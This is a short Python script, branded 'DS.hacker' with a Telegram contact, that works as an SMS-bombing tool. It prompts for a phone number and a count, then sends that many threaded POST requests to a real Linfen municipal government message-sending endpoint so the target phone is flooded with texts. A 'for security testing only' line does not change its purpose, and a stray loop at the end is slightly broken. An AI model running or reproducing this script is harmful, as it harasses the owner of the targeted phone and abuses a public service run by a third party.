import os

import requests
import threading
import logging

# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def send_request(session, i, userphone):
    """
    使用给定的会话发送HTTP POST请求。

    :param session: requests.Session 对象，用于发送请求
    :param i: 请求的索引（用于日志记录）
    :param userphone: 要发送的手机号码
    """
    try:
        url = "http://szrx.linfen.gov.cn:8080/lf_12345_api/rx/mailbox/sendMessageOnly"
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; MyApp/1.0)",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
        }
        data = {"userphone": userphone}
        response = session.post(url, headers=headers, data=data)
        logging.info(f"Request {i + 1}: Status Code {response.status_code}")
        if response.status_code == 200:
            logging.info("Success: " + response.text)
        else:
            logging.warning(f"Failed: Status Code {response.status_code}, Body: {response.text}")
    except requests.RequestException as e:
        logging.error(f"Error in request {i + 1}: {e}")


if __name__ == "__main__":
    os.system("clear")
    os.system("figlet DS.hacker")
    print("______________________")
    print("     DS.hacker     ")
    print("    仅为安全测试    ")
    print("TG:Https://t.me//hackerDss")
    print("______________________")
    userphone = input("请输入手机号: ")
    num_requests = int(input("请输入发送请求的次数: "))

    # 使用requests.Session()来管理会话，这有助于重用连接并提高效率
    with requests.Session() as session:
        threads = []

        for i in range(num_requests):
            t = threading.Thread(target=send_request, args=(session, i, userphone))
            threads.append(t)
            t.start()

            # 等待所有线程完成
        for t in threads:
            t.join()

    logging.info("所有请求已发送完毕。")

for t in threads:
    t.join()
